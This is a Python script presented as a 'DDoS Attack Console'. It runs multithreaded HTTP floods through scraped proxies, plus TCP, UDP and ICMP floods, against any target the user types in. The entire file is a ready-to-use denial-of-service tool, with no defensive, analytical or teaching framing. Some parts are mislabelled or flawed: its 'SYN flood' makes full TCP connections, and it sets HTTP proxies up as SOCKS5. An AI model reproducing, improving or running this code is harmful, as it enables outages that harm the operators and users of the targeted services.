import requests
import threading
import random
import socket
import socks
import time
import sys

# Proxy Scraper
def get_proxies():
    url = "https://www.proxy-list.download/api/v1/get?type=http"
    response = requests.get(url)
    return response.text.strip().split("\r\n")

# Proxy Setup
def set_proxy(proxy):
    proxy_parts = proxy.split(":")
    if len(proxy_parts) == 2:
        socks.set_default_proxy(socks.SOCKS5, proxy_parts[0], int(proxy_parts[1]))
    elif len(proxy_parts) == 4:
        socks.set_default_proxy(socks.SOCKS5, proxy_parts[0], int(proxy_parts[1]), True, proxy_parts[2], proxy_parts[3])

# HTTP Flood Attack
def http_flood(target, duration, threads, method):
    proxies = get_proxies()
    end_time = time.time() + duration

    def attack():
        while time.time() < end_time:
            proxy = random.choice(proxies)
            set_proxy(proxy)

            try:
                s = socks.socksocket()
                s.connect((target, 80))
                
                user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80,100)}.0.3987.87 Safari/537.36"
                
                if method == "GET":
                    request = f"GET /?{random.randint(1, 10000)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {user_agent}\r\nConnection: keep-alive\r\n\r\n"
                else:
                    request = f"POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {user_agent}\r\nContent-Length: 1000\r\nConnection: keep-alive\r\n\r\n"

                s.sendall(request.encode())
                s.close()
            except:
                pass

    for _ in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

# TCP SYN Flood Attack
def syn_flood(target, port, duration, threads):
    end_time = time.time() + duration

    def attack():
        while time.time() < end_time:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((target, port))
                s.send(b"\x00" * 1024)
                s.close()
            except:
                pass

    for _ in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

# UDP Flood Attack
def udp_flood(target, port, duration, threads):
    end_time = time.time() + duration
    packet = random._urandom(1024)

    def attack():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(packet, (target, port))
                s.close()
            except:
                pass

    for _ in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

# ICMP (Ping Death) Attack
def icmp_flood(target, duration, threads):
    end_time = time.time() + duration
    packet = b"\x08\x00\xf7\xff" + b"\x00" * 1464

    def attack():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                s.sendto(packet, (target, 1))
                s.close()
            except:
                pass

    for _ in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

# Command Lobby
def lobby():
    print("\n=== DDoS Attack Console ===")
    target = input("Enter target IP/Domain: ")
    port = int(input("Enter target port: "))
    duration = int(input("Enter attack duration (seconds): "))
    threads = int(input("Enter number of threads: "))

    print("\nSelect Attack Method:")
    print("[1] HTTP Flood")
    print("[2] TCP SYN Flood")
    print("[3] UDP Flood")
    print("[4] ICMP (Ping Death)")
    
    choice = input("Enter method number: ")

    if choice == "1":
        method = input("Enter HTTP method (GET/POST): ").upper()
        http_flood(target, duration, threads, method)
    elif choice == "2":
        syn_flood(target, port, duration, threads)
    elif choice == "3":
        udp_flood(target, port, duration, threads)
    elif choice == "4":
        icmp_flood(target, duration, threads)
    else:
        print("Invalid choice. Exiting.")

    print("\n[+] Attack initiated! Press Ctrl+C to stop.")

if __name__ == "__main__":
    lobby()
